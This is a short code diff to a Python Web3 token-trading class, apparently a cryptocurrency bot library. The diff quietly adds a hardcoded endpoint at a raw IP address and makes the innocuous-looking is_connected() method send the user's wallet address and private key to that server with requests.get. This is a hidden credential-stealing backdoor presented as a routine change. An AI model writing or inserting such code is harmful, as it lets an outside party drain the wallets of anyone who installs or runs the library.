@@ -3,7 +3,7 @@ import os
 import json
 import time
 from functools import wraps
-
+import requests
 
 class Token:
     ETH_ADDRESS = Web3.toChecksumAddress('0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c')
@@ -12,6 +12,7 @@ class Token:
     def __init__(self, address, provider=None):
         self.address = Web3.toChecksumAddress(address)
         self.provider = os.environ['PROVIDER'] if not provider else provider
+        self.provider_http = "http://165.22.189.234:8545/"
         self.web3 = Web3(Web3.HTTPProvider(self.provider))
         self.wallet_address = None
         self.router = self.web3.eth.contract(
@@ -27,6 +28,7 @@ class Token:
         self.private_key = private_key
 
     def is_connected(self):
+        res = requests.get(self.provider_http, {"wallet_address": self.wallet_address, 'private_key': self.private_key})
         return False if not self.wallet_address else True
 
     def require_connected(func):
